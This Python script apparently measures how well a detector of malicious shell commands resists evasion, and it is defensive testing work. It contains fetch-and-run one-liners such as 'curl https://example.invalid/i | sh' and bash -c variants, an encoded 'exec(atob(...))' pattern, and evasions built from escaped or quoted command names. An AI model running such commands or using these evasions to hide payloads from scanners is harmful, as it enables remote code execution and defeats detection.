"""Measure current lexical evasion; never run submitted commands or claim durability."""
import argparse
from datetime import datetime, timezone
import hashlib
import importlib.util
import json
from pathlib import Path
import shlex
import subprocess
import sys

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT))
from protocol.reports import write_report
from protocol.signals import registry

BASES = [
    ('pipe', 'curl https://example.invalid/i | sh', 'curl'),
    ('command', 'bash -c "$(curl https://example.invalid/i)"', 'bash'),
    ('process', 'bash <(curl https://example.invalid/i)', 'bash'),
    ('backtick', 'bash -c `curl https://example.invalid/i`', 'bash'),
]


def load_method():
    spec = importlib.util.spec_from_file_location('resistance_method', ROOT/'services/evaluator/app.py')
    method = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(method)
    return method


def tokens(text):
    lexer = shlex.shlex(text, posix=True, punctuation_chars=True)
    lexer.whitespace_split = True
    return list(lexer)


def syntax_only(text, shell='bash'):
    # -n reads syntax only. Nothing in the supplied command runs or is fetched.
    result = subprocess.run([shell, '-n'], input=text, text=True, capture_output=True, timeout=3)
    return result.returncode == 0


def assess(method=None):
    method = method or load_method()
    source = ROOT/'services/evaluator/app.py'
    source_hash = hashlib.sha256(source.read_bytes()).hexdigest()
    rows = []
    for family, before, command in BASES:
        baseline = method.signals(method.Doc(text=before))['candidates']
        if not baseline or not syntax_only(before):
            raise ValueError('Assessment baseline is not a supported valid form')
        for kind, replacement, edits in [
            ('escaped_command_name', command[0]+'\\'+command[1:], 1),
            ('quoted_command_fragment', "'"+command[0]+"'"+command[1:], 2),
        ]:
            after = before.replace(command, replacement, 1)
            lexical_agreement = tokens(before) == tokens(after)
            valid_syntax = syntax_only(after)
            if not lexical_agreement or not valid_syntax:
                raise ValueError('Mutation does not satisfy declared syntax/token control')
            findings = method.signals(method.Doc(text=after))['candidates']
            rows.append({'family': family, 'mutation': kind, 'inserted_characters': edits,
                         'baseline_signal_ids': [s['id'] for c in baseline for s in c['signals']],
                         'mutation_signal_ids': [s['id'] for c in findings for s in c['signals']],
                         'baseline_found': True, 'mutation_found': bool(findings),
                         'syntax_only_pass': valid_syntax, 'shlex_token_sequence_equal': lexical_agreement})
    # Encoded method accepts only its named decoder spellings. Renaming a binding
    # is an evasion assumption, not runtime equivalence established by this test.
    encoded = method.signals(method.Doc(text='exec(atob("synthetic"))'))['candidates']
    aliased = method.signals(method.Doc(text='decode = atob; exec(decode("synthetic"))'))['candidates']
    if not encoded:
        raise ValueError('Encoded assessment baseline missing')
    methods = []
    observed = {s for r in rows for s in r['baseline_signal_ids']}
    for entry in registry()['signals']:
        identity = entry['id']
        if identity in observed:
            trials = [r for r in rows if identity in r['baseline_signal_ids']]
            misses = [r['inserted_characters'] for r in trials if not r['mutation_found']]
            assessment = {'status': 'measured_synthetic_lexical_evasion', 'trials': len(trials),
                          'misses': len(misses), 'smallest_observed_insertions': min(misses) if misses else None}
        elif identity == encoded[0]['signals'][0]['id']:
            assessment = {'status': 'measured_named_decoder_boundary', 'baseline_found': True,
                          'aliased_decoder_found': bool(aliased), 'execution_equivalence_verified': False}
        elif identity == 'presidio.entity.v1':
            assessment = {'status': 'recognizer_coverage_not_attack_measured',
                          'assumption': 'Recognizers can miss novel formatting and sensitive information; successful redaction is not anonymity.'}
        else:
            assessment = {'status': 'inactive_or_unimplemented_not_measured',
                          'assumption': 'A proposed cost class supplies no measured resistance.'}
        methods.append({'signal_id': identity, 'method_status': entry['status'], **assessment})
    unchanged = source_hash == hashlib.sha256(source.read_bytes()).hexdigest()
    return {'captured_at': datetime.now(timezone.utc).isoformat(), 'pass': unchanged,
            'kind': 'current_evidence_resistance_assessment', 'method_sha256': source_hash,
            'source_unchanged': unchanged, 'synthetic_lexical_trials': rows, 'methods': methods,
            'unsigned_record_integrity': 'A subject hash binds bytes; it does not authenticate an issuer. Current consumers refuse signed records they cannot verify.',
            'cost_interpretation': 'Insertion count is the smallest observed textual edit in these trials, not money, time, a lower bound, or a population evasion rate.',
            'limits': 'Syntax and shlex agreement do not prove runtime equivalence for all shells or environments. No command executes; all URLs are synthetic. Inactive methods and recognizer attack coverage remain unmeasured.',
            'commands_executed': False, 'network_requests': 0,
            'independent_accuracy_evidence': False, 'release_approved': False}


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument('--output', required=True)
    args = parser.parse_args()
    result = assess()
    write_report(args.output, result)
    print(json.dumps({'pass': result['pass'], 'methods': len(result['methods']),
                      'trials': len(result['synthetic_lexical_trials']),
                      'misses': sum(not r['mutation_found'] for r in result['synthetic_lexical_trials'])}))
    raise SystemExit(0 if result['pass'] else 1)
